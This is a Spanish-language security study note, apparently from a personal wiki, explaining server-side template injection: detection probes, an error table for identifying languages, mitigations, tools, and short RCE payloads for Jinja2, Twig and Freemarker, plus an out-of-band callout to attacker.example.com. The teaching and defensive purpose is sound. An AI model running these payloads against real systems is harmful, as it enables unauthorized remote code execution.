---
tags:
  - seguridad-web
  - owasp
  - ssti
aliases:
  - SSTI
  - Server-Side Template Injection
  - Inyección de plantillas del lado del servidor
---

# SSTI (Server-Side Template Injection)

**La inyección de plantillas del lado del servidor ocurre cuando la entrada del usuario se incrusta sin sanitizar en una plantilla que el motor renderiza en el servidor.** Permite leer datos internos y, con frecuencia, escalar a ejecución remota de código (RCE).

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Los motores de plantillas (Jinja2, Twig, Freemarker, etc.) sustituyen marcadores como `{{ variable }}` por valores reales al renderizar HTML, PDF, correos o facturas. Si la entrada del usuario llega a la plantilla en lugar de pasarse como dato, el atacante puede inyectar **sintaxis de plantilla** que el servidor evalúa. El impacto va desde la fuga de variables y objetos internos hasta RCE completo, según el motor y el sandbox.

## Detección y pruebas
Busca cualquier punto donde la entrada se refleje renderizada: formularios, parámetros de URL, buscadores, vistas previas. **Las plantillas suelen usarse en PDF, facturas y correos generados**, candidatos habituales.

- Expresión matemática dentro de las etiquetas: si `7*7` devuelve `49`, hay evaluación (no una simple reflexión).
- Polyglot universal que provoca error si existe SSTI: `${{<%[%'"}}%\.`
- Etiquetas comunes a probar: `{{ }}`, `${ }`, `#{ }`, `<%= %>`, `*{ }`, `@{ }`.

Identifica el lenguaje por el error que genera `(1/0).zxy.zxy`:

| Error | Lenguaje |
|---|---|
| `ZeroDivisionError` | Python |
| `java.lang.ArithmeticException` | Java |
| `ReferenceError` / `TypeError` | NodeJS |
| `Division by zero` / `DivisionByZeroError` | PHP |
| `divided by 0` | Ruby |
| `Arithmetic operation failed` | Freemarker (Java) |

Para SSTI ciega, compara pares de payloads booleanos (uno válido, otro con error de sintaxis): `(3*4/2)` vs `3*)2(/4`.

## Explotación / payloads
Detección por motor:

```jinja2
{{7*7}}      # Jinja2 (Python) -> 49
{{7*'7'}}    # Jinja2 -> 7777777 ; Twig -> 49
#{7*7}       # Thymeleaf (Java)
<%= 7*7 %>   # ERB (Ruby)
```

Escalada a RCE en Jinja2 (Python) abusando del MRO de objetos:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Twig (PHP):

```twig
{{ ['id'] | filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

Freemarker (Java):

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

Cuando no hay reflexión directa: técnica **time-based** (forzar retardo con `sleep`) u **out-of-band** (conexión a servidor controlado, p. ej. `http://attacker.example.com`).

## Mitigación
- No incrustar entrada del usuario en plantillas; pasarla siempre como **dato/contexto**, nunca concatenada a la plantilla.
- Usar motores en **modo sandbox** (p. ej. `SandboxedEnvironment` de Jinja2) y deshabilitar funciones peligrosas.
- Validar y filtrar la entrada con lista de permitidos; escapar la salida.
- Ejecutar el renderizado con privilegios mínimos y aislamiento (contenedor) para limitar el impacto de un RCE.

## Herramientas
- **tplmap** / **SSTImap** — detección y explotación automática de SSTI.
- **TInjA** (Hackmanit) — escáner SSTI/CSTI con polyglots.
- **Template Injection Table** (Hackmanit) — tabla de polyglots y respuestas esperadas por motor.

---
🔗 Relacionado: [[Inclusión de archivos (LFI-RFI)]] · [[Laboratorio DVWA (CTF)]]
📚 Fuente: [PayloadsAllTheThings — Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) (MIT, © Swissky)
